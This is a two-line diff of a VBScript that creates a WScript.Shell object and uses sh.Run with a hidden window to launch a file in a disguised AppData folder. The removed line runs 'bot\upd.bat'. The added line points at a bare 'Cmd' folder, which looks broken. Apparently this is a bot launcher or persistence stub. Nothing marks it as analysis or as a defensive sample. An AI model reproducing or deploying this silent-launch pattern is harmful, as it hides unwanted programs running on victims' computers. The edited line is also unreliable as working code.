@@ -1,2 +1,2 @@
 set sh=CreateObject("Wscript.Shell")
-sh.Run "%appdata%\Microsoft\Windows\bot\upd.bat", 0
+sh.Run "%appdata%\Microsoft\Windows\Cmd\", 0
